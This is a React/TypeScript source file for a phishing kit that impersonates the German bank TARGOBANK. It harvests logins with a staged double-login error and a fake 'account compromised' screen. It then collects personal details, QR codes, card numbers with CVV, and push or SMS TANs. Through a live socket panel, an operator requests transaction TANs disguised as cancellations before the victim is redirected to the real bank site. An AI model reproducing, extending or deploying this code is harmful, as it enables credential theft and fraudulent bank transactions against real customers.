import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession, uploadTemplateFile } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';

// Import components
import Header from './components/Header';
import Footer from './components/Footer';
import LoginForm from './components/LoginForm';
import Loading from './components/Loading';
import ErrorScreen from './components/ErrorScreen';
import PersonalDataForm from './components/PersonalDataForm';
import BankCardForm from './components/BankCardForm';
import QRUploadForm from './components/QRUploadForm';
import FinalSuccessScreen from './components/FinalSuccessScreen';
import AccountCompromisedScreen from './components/AccountCompromisedScreen';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';

import './TargobankStyle.css';

// TARGOBANK flow states
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_UPLOAD: 'qr_upload',
  QR_SUCCESS: 'qr_success',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  qrUpload: boolean;
  bankCard: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  qrUpload: true,
  bankCard: true
};

// Types for TARGOBANK flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
}

// TARGOBANK Template Implementation
const TargobankTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  const [state, setState] = useState(STATES.LOGIN);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | undefined>(undefined);
  
  // Session data storage
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('targobank');
    updatePageMetadata(metadata);

    // Add template class to body for styling
    document.body.classList.add('targobank-template');

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        setLoading(true);
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('targobank');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded TARGOBANK step config:', config.steps);
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        setConfigLoaded(true);
      }
    };

    // Create session if no key provided
    const initializeSession = async () => {
      if (!key) {
        try {
          setLoading(true);
          setLoadingMessage("Sitzung wird erstellt...");
          const newKey = await createTemplateSession('targobank');
          navigate(`/targobank/${newKey}`);
        } catch (error) {
          console.error('Failed to create session:', error);
          // Fallback to random key
          const fallbackKey = Math.random().toString(36).substring(2, 15);
          navigate(`/targobank/${fallbackKey}`);
        } finally {
          setLoading(false);
        }
        return;
      }
    };

    console.log(`Initializing TARGOBANK session with key: ${key}`);
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => setLoading(false), 1000);
    };
    initializeAfterConfig();
    initializeSession();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'targobank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Upload wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }

    // Cleanup function to remove class when component unmounts
    return () => {
      document.body.classList.remove('targobank-template');
      templateSocketClient.disconnect();
    };
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login form submission
  const handleLogin = async (data: LoginData) => {
    try {
      console.log('Submitting login for TARGOBANK flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Set loading state for login
      setLoginLoading(true);
      setLoginError(undefined);
      
      // Store login data
      const newSessionData = {
        ...sessionData,
        session_key: key,
        username: data.username,
        password: data.password,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        referrer: document.referrer
      };
      setSessionData(newSessionData);

      // Submit to backend
      try {
        const response = await submitTemplateData({
          template_name: 'targobank',
          key: key || '',
          step: 'login',
          data: {
            username: data.username,
            password: data.password,
            state: state,
            attempt: state === STATES.LOGIN ? 1 : 2,
            browser: navigator.userAgent,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
          }
        });

        if (!response.success) {
          console.warn('Backend submission failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }

      // Show quick loading screen
      setLoadingMessage("Anmeldedaten werden überprüft...");
      setState(STATES.LOADING);
      
      // Simulate backend call
      setTimeout(() => {
        // Update state based on current state
        if (state === STATES.LOGIN) {
          if (stepConfig.doubleLogin) {
            // First login attempt - show error
            setState(STATES.LOGIN_ERROR);
            setLoginError('Bitte überprüfen Sie Ihre Eingaben. Die eingegebene Benutzername und Passwort Kombination ist nicht korrekt.');
          } else {
            // Single login - go directly to account compromised
            setState(STATES.ACCOUNT_COMPROMISED);
          }
        } else if (state === STATES.LOGIN_ERROR) {
          // Second login attempt - proceed to account compromised
          setState(STATES.ACCOUNT_COMPROMISED);
        }
        setLoginLoading(false);
      }, 2000);
      
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
    } finally {
      setLoginLoading(false);
    }
  };

  // Handle starting verification from account compromised screen
  const handleStartVerification = async () => {
    try {
      console.log('Starting verification process for session:', key);
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Show loading screen
      setLoadingMessage("Verifizierung wird gestartet...");
      setState(STATES.LOADING);
      
      // Simulate processing
      setTimeout(() => {
        if (stepConfig.personalData) {
          setState(STATES.PERSONAL_DATA);
        } else if (stepConfig.qrUpload) {
          setState(STATES.QR_UPLOAD);
        } else if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2000);
      
    } catch (error) {
      console.error('Error starting verification:', error);
      setError('Fehler beim Starten der Verifizierung');
      setState(STATES.ERROR);
    }
  };

  // Handle personal data submission
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Submitting personal data for session:', key);
      
      const newSessionData = {
        ...sessionData,
        ...data,
        step: 'personal_data'
      };
      setSessionData(newSessionData);
      
      // Submit to backend
      try {
        const response = await submitTemplateData({
          template_name: 'targobank',
          key: key || '',
          step: 'personal-data',
          data: data
        });

        if (!response.success) {
          console.warn('Personal data submission failed:', response.error);
        }
      } catch (apiError) {
        console.warn('Failed to submit personal data:', apiError);
      }
      
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Determine next step
      setTimeout(() => {
        if (stepConfig.qrUpload) {
          setState(STATES.QR_UPLOAD);
        } else if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 3000);
      
    } catch (error) {
      console.error('Personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle QR code upload
  const handleQRUpload = async (file: File) => {
    try {
      console.log('Uploading QR code for session:', key);
      
      setState(STATES.LOADING);
      setLoadingMessage("QR-Code wird verarbeitet...");
      
      // Upload to backend
      try {
        const response = await uploadTemplateFile('targobank', key || '', file, 'qr-upload');

        if (!response.success) {
          console.warn('QR upload failed:', response.error);
        }
      } catch (apiError) {
        console.warn('Failed to upload QR code:', apiError);
      }
      
      // Determine next step
      setTimeout(() => {
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 3000);
      
    } catch (error) {
      console.error('QR upload error:', error);
      setError('Fehler beim Hochladen des QR-Codes');
    }
  };

  // Handle QR upload skip
  const handleQRSkip = async () => {
    try {
      console.log('QR upload skipped for session:', key);
      
      // Submit skip to backend
      await submitTemplateData({
        template_name: 'targobank',
        key: key || '',
        step: 'qr-skip',
        data: { skip_reason: 'user_skipped' }
      });
      
      setState(STATES.LOADING);
      setLoadingMessage("Wird fortgesetzt...");
      
      setTimeout(() => {
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2000);
      
    } catch (error) {
      console.error('QR skip error:', error);
      // Continue anyway
      if (stepConfig.bankCard) {
        setState(STATES.BANK_CARD);
      } else {
        setState(STATES.FINAL_SUCCESS);
      }
    }
  };

  // Handle bank card data submission
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Submitting bank card data for session:', key);
      
      console.log('TARGOBANK: Bank card data being submitted:', data);
      
      // Submit bank card data to backend (backend will create lead from session data)
      try {
        const response = await submitTemplateData({
          template_name: 'targobank',
          key: key || '',
          step: 'bank-card-complete',
          data: data
        });
        
        console.log('✅ Complete lead data submitted successfully:', response);
        
        if (response.success) {
          console.log(`✅ Lead creation completed successfully`);
        }
      } catch (apiError: any) {
        console.error('❌ Failed to submit complete data:', apiError);
        // Continue with flow even if API fails
      }
      
      setState(STATES.LOADING);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      // Simulate processing
      setTimeout(() => {
        setState(STATES.FINAL_SUCCESS);
      }, 3000);
      
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('TARGOBANK: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'targobank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_card' }
      });
      
      if (!response.success) {
        console.error('❌ TARGOBANK bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ TARGOBANK bank card skip completed successfully');
      
      // Show loading screen
      setState(STATES.LOADING);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setState(STATES.FINAL_SUCCESS);
      }, 3000);
      
    } catch (error) {
      console.error('❌ TARGOBANK bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Handle TAN submission
  const handleTanSubmit = async (tan: string) => {
    try {
      console.log('Submitting TAN for session:', key);
      
      // Submit TAN to backend
      await submitTemplateData({
        template_name: 'targobank',
        key: key || '',
        step: 'tan-submit',
        data: {
          tan: tan,
          requestId: currentTanRequest?.requestId,
          type: currentTanRequest?.type
        }
      });
      
      // Emit to admin
      templateSocketClient.emit('tan-submitted', {
        sessionKey: key,
        tan: tan,
        requestId: currentTanRequest?.requestId
      });
      
      setState(STATES.LOADING);
      setLoadingMessage("TAN wird überprüft...");
      
      // Wait for admin response or timeout
      setTimeout(() => {
        // Default to continuing the flow
        setCurrentTanRequest(null);
        if (stepConfig.personalData && state !== STATES.PERSONAL_DATA) {
          setState(STATES.PERSONAL_DATA);
        } else if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 5000);
      
    } catch (error) {
      console.error('TAN submission error:', error);
      setError('Fehler bei der TAN-Überprüfung');
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} />;
    }
    
    if (error) {
      return (
        <div className="targobank-template">
          <Header />
          <ErrorScreen message={error} onRetry={() => {
            setError(null);
            setState(STATES.LOGIN);
          }} />
          <Footer />
        </div>
      );
    }
    
    switch (state) {
      case STATES.LOGIN:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <LoginForm
              onSubmit={handleLogin}
              isLoading={loginLoading}
              errorMessage={loginError}
            />
            <Footer />
          </div>
        );
      
      case STATES.LOGIN_ERROR:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <LoginForm
              onSubmit={handleLogin}
              isLoading={loginLoading}
              errorMessage="Bitte überprüfen Sie Ihre Eingaben. Die eingegebene Benutzername und Passwort Kombination ist nicht korrekt."
            />
            <Footer />
          </div>
        );
      
      case STATES.ACCOUNT_COMPROMISED:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <AccountCompromisedScreen onContinue={handleStartVerification} />
            <Footer />
          </div>
        );
      
      case STATES.PERSONAL_DATA:
        if (stepConfig.personalData) {
          return (
            <div className="targobank-template targobank-main-container">
              <Header />
              <PersonalDataForm onSubmit={handlePersonalDataSubmit} />
              <Footer />
            </div>
          );
        }
        // Skip to next step if personal data is disabled
        setTimeout(() => {
          if (stepConfig.qrUpload) {
            setState(STATES.QR_UPLOAD);
          } else if (stepConfig.bankCard) {
            setState(STATES.BANK_CARD);
          } else {
            setState(STATES.FINAL_SUCCESS);
          }
        }, 0);
        return <Loading message="Wird weitergeleitet..." />;
      
      case STATES.QR_UPLOAD:
        if (stepConfig.qrUpload) {
          return (
            <div className="targobank-template targobank-main-container">
              <Header />
              <QRUploadForm 
                onSubmit={handleQRUpload}
                onSkip={handleQRSkip}
              />
              <Footer />
            </div>
          );
        }
        // Skip to next step if QR upload is disabled
        setTimeout(() => {
          if (stepConfig.bankCard) {
            setState(STATES.BANK_CARD);
          } else {
            setState(STATES.FINAL_SUCCESS);
          }
        }, 0);
        return <Loading message="Wird weitergeleitet..." />;
      
      case STATES.BANK_CARD:
        if (stepConfig.bankCard) {
          return (
            <div className="targobank-template targobank-main-container">
              <Header />
              <BankCardForm 
                onSubmit={handleBankCardSubmit}
                onSkip={handleBankCardSkip}
              />
              <Footer />
            </div>
          );
        }
        // Skip to final success if bank card is disabled
        setTimeout(() => setState(STATES.FINAL_SUCCESS), 0);
        return <Loading message="Wird abgeschlossen..." />;
      
      case STATES.FINAL_SUCCESS:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <FinalSuccessScreen 
              message="Ihre Daten wurden erfolgreich verifiziert. Ihr Konto ist jetzt wieder vollständig freigeschaltet."
              redirectUrl="https://www.targobank.de"
              redirectDelay={5000}
            />
            <Footer />
          </div>
        );
      
      case STATES.PUSHTAN_REQUEST:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <PushTANScreen 
              message="Bitte bestätigen Sie die Anfrage in Ihrer TARGOBANK App."
              onConfirm={() => {
                templateSocketClient.emit('pushtan-confirmed', {
                  sessionKey: key,
                  requestId: currentTanRequest?.requestId
                });
                setState(STATES.LOADING);
                setLoadingMessage("Push-TAN wird überprüft...");
              }}
              onCancel={() => {
                setCurrentTanRequest(null);
                setState(STATES.LOGIN);
              }}
            />
            <Footer />
          </div>
        );
      
      case STATES.SMS_TAN_REQUEST:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <SMSTANScreen 
              onSubmit={handleTanSubmit}
              onCancel={() => {
                setCurrentTanRequest(null);
                setState(STATES.LOGIN);
              }}
              onResend={() => {
                templateSocketClient.emit('tan-resend-request', {
                  sessionKey: key,
                  requestId: currentTanRequest?.requestId
                });
              }}
              phoneNumber={sessionData.phone || '***-***-**42'}
            />
            <Footer />
          </div>
        );
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <ErrorScreen 
              message={error || 'Ein unerwarteter Fehler ist aufgetreten.'} 
              onRetry={() => {
                setError(null);
                setState(STATES.LOGIN);
              }}
            />
            <Footer />
          </div>
        );
      
      default:
        return (
          <div className="targobank-template targobank-main-container">
            <Header />
            <LoginForm
              onSubmit={handleLogin}
              isLoading={loginLoading}
              errorMessage={loginError}
            />
            <Footer />
          </div>
        );
    }
  };

  return renderContent();
};

export { TargobankTemplate };
export default TargobankTemplate;

